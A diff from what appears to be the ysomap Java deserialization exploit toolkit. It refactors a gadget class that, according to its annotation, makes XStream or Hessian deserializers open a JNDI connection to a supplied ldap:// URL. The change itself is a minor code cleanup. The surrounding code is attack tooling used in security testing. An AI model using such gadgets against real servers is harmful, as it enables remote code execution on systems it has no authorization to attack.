@@ -1,9 +1,9 @@
 package ysomap.bullets.jdk;
 
 import sun.swing.SwingLazyValue;
+import ysomap.bullets.AbstractBullet;
 import ysomap.bullets.Bullet;
 import ysomap.common.annotation.*;
-import ysomap.core.util.ReflectionHelper;
 
 /**
  * @author wh1t3P1g
@@ -14,7 +14,7 @@ import ysomap.core.util.ReflectionHelper;
 @Details("向外部发起JNDI连接")
 @Targets({Targets.XSTREAM, Targets.HESSIAN})
 @Authors({Authors.WH1T3P1G})
-public class SwingLazyValueWithJNDIBullet implements Bullet<SwingLazyValue> {
+public class SwingLazyValueWithJNDIBullet extends AbstractBullet<SwingLazyValue> {
 
     @NotNull
     @Require(name = "jndiURL", detail = "like ldap://xxx/xx")
@@ -30,7 +30,7 @@ public class SwingLazyValueWithJNDIBullet implements Bullet<SwingLazyValue> {
 
     public static Bullet newInstance(Object... args) throws Exception {
         Bullet bullet = new SwingLazyValueWithJNDIBullet();
-        ReflectionHelper.set(bullet, "jndiURL", args[0]);
+        bullet.set("jndiURL", args[0]);
         return bullet;
     }
 }
